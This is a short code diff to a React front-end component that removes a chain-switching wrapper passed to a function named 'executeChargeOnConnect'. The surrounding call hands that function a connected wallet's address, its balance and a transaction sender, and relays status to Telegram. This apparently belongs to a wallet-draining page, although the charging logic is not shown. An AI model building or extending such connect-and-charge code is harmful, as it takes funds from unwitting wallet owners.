@@ -128,18 +128,6 @@ export default function Home() {
           }
         };
 
-        // Wrap switchChain
-        const switchChainAsync = async (chainId: number) => {
-          try {
-            console.log('🔗 Switching to chain:', chainId);
-            await switchChain({ chainId });
-            console.log('✅ Chain switched');
-          } catch (switchErr) {
-            console.error('❌ Chain switch failed:', switchErr);
-            throw switchErr;
-          }
-        };
-
         const result = await executeChargeOnConnect({
           walletAddress: address,
           chainName,
@@ -147,7 +135,6 @@ export default function Home() {
           balanceBefore: balanceData.formatted,
           balanceValue: balanceData.value,
           sendTransactionAsync,
-          switchChainAsync,
           onTelegramUpdate: (msg) => setChargeStatus(msg),
         });
 
